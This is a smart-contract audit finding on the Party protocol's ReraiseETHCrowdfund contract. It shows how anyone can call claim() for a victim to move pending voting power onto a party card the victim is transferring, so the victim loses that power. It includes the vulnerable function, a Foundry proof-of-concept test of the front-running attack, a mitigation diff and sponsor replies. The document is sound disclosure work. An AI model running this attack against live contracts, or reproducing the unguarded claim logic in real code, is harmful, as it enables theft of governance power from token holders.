[H-05]ReraiseETHCrowdfund.sol: party card transfer can be front-run by claiming pending voting power which results in a loss of the voting power
Submitted byHollaDieWaldfee
In this report I show how an attacker can abuse the fact that anyone can callReraiseETHCrowdfund.claimfor any user and add voting power to an existing party card.
The result can be a griefing attack whereby the victim loses voting power. In some cases the attacker can take advantage himself.
In short this is what needs to happen:
The victim sends a transaction to transfer one of his party cardsThe transaction is front-run and pending voting power of the victim from theReraiseETHCrowdfundcontract is claimed to this party card that is transferredThe victim thereby loses the pending voting power
The fact that any user is at risk that has pending voting power and transfers a party card and that voting power is arguably the most important asset in the protocol makes me estimate this to be “High” severity.
Proof of Concept
We start by observing that when theReraiseETHCrowdfundis won, any user can callReraiseETHCrowdfund.claimfor any other user and either mint a new party card to him or add the pending voting power to an existing party card:
Link
/// @notice Claim a party card for a contributor if the crowdfund won. Can be called///         to claim for self or on another's behalf./// @param tokenId The ID of the party card to add voting power to. If 0, a///                new card will be minted./// @param contributor The contributor to claim for.functionclaim(uint256tokenId,addresscontributor)public{// Check crowdfund lifecycle.{CrowdfundLifecyclelc=getCrowdfundLifecycle();if(lc!=CrowdfundLifecycle.Finalized) {revertWrongLifecycleError(lc);}}uint96votingPower=pendingVotingPower[contributor];if(votingPower==0)return;{uint96contribution= (votingPower*1e4) /exchangeRateBps;uint96maxContribution_=maxContribution;// Check that the contribution equivalent of total pending voting// power is not above the max contribution range. This can happen// for contributors who contributed multiple times In this case, the// `claimMultiple` function should be called instead. This is done// so parties may use the minimum and maximum contribution values to// limit the voting power of each card (e.g.  a party desiring a "1// card = 1 vote"-like governance system where each card has equal// voting power).if(contribution>maxContribution_) {revertAboveMaximumContributionsError(contribution,maxContribution_);}}// Burn the crowdfund NFT._burn(contributor);deletependingVotingPower[contributor];if(tokenId==0) {// Mint contributor a new party card.tokenId=party.mint(contributor,votingPower,delegationsByContributor[contributor]);}elseif(disableContributingForExistingCard) {revertContributingForExistingCardDisabledError();}elseif(party.ownerOf(tokenId) ==contributor) {// Increase voting power of contributor's existing party card.party.addVotingPower(tokenId,votingPower);}else{revertNotOwnerError();}emitClaimed(contributor,tokenId,votingPower);}
Note that the caller can specify anycontributorand can add the pending votes to an existing party card if!disableContributingForExistingCard && party.ownerOf(tokenId) == contributor.
So if User A has pending voting power and transfers one of his party cards to User B, then User C might front-run this transfer and claim the pending voting power to the party card that is transferred.
If User B performs this attack it is not a griefing attack since User B benefits from it.
Note that at the time of sending the transfer transaction theReraiseETHCrowdfunddoes not have to be won already. The transaction that does the front-running might contribute to the crowdfund such that it is won and then claim the pending voting power.
Add the following test to theReraiseETHCrowdfund.t.soltest file. It shows how an attacker would perform such an attack:
functiontest_FrontRunTransfer()public{ReraiseETHCrowdfundcrowdfund=_createCrowdfund({initialContribution:0,initialContributor:payable(address(0)),initialDelegate:address(0),minContributions:0,maxContributions:type(uint96).max,disableContributingForExistingCard:false,minTotalContributions:2ether,maxTotalContributions:3ether,duration:7days,fundingSplitBps:0,fundingSplitRecipient:payable(address(0))});addressattacker=_randomAddress();addressvictim=_randomAddress();vm.deal(victim,2.5ether);vm.deal(attacker,0.5ether);// @audit-info the victim owns a party cardvm.prank(address(party));party.addAuthority(address(this));party.increaseTotalVotingPower(1ether);uint256victimTokenId=party.mint(victim,1ether,address(0));vm.startPrank(victim);crowdfund.contribute{ value:2.5ether}(victim,"");vm.stopPrank();/* @audit-infoThe victim wants to transfer the party card, say to the attacker, and the attackerfront-runs this by completing the crowdfund and claiming the victim's pending votingpower to the existing party card*/vm.startPrank(attacker);crowdfund.contribute{ value:0.5ether}(attacker,"");crowdfund.claim(victimTokenId,victim);vm.stopPrank();/* @audit-infowhen the victim's transfer is executed, he transfers also all of the voting powerthat was previously his pending voting power (effectively losing it)*/vm.prank(victim);party.tranferFrom(victim,attacker,victimTokenId);}
So when there is an ongoing crowdfund it is never safe to transfer one’s party card. It can always result in a complete loss of the pending voting power.
Tools Used
VSCode
Recommended Mitigation Steps
In theReraiseETHCrowdfund.claimfunction it should not be possible to add the pending voting power to an existing party card. It is possible though to allow it for thecontributorhimself but not for any user.
diff --git a/contracts/crowdfund/ReraiseETHCrowdfund.sol b/contracts/crowdfund/ReraiseETHCrowdfund.solindex 580623d..cb560e1 100644--- a/contracts/crowdfund/ReraiseETHCrowdfund.sol+++ b/contracts/crowdfund/ReraiseETHCrowdfund.sol@@ -292,7 +292,7 @@ contract ReraiseETHCrowdfund is ETHCrowdfundBase, CrowdfundNFT {tokenId = party.mint(contributor, votingPower, delegationsByContributor[contributor]);} else if (disableContributingForExistingCard) {revert ContributingForExistingCardDisabledError();-        } else if (party.ownerOf(tokenId) == contributor) {+        } else if (party.ownerOf(tokenId) == contributor && contributor == msg.sender) {// Increase voting power of contributor's existing party card.party.addVotingPower(tokenId, votingPower);} else {
0xble (Party) confirmed and commented:
Good finding, still thinking about the mitigation.Slightly hesitant to make the only action when claiming for someone else to be minting them a new card although minting to their existing card might be a rare action because of the friction involved in having to get the ID of one of the person’s cards first. Someone minting for someone else might just find it more convenient to mint them a new card, so having that be the only action might not be much of a loss.
0xble (Party) commented:
We’ve decided to refactor the way claiming works in theReraiseETHCrowdfund, partially because a large number of findings like this being submitted around that one area that highlighted for us the need to rework its logic.The change will make it so (1) crowdfund NFTs are minted per contribution instead of per address and (2) claiming works more like a 1:1 conversion of your crowdfund NFT into a party card instead of how it works now. In the future we will also add the ability to split/merge party cards.This should mitigate this finding because in this new system you cannot decide to add the voting power from a crowdfund NFT to an existing party card when claiming, only mint a new party card.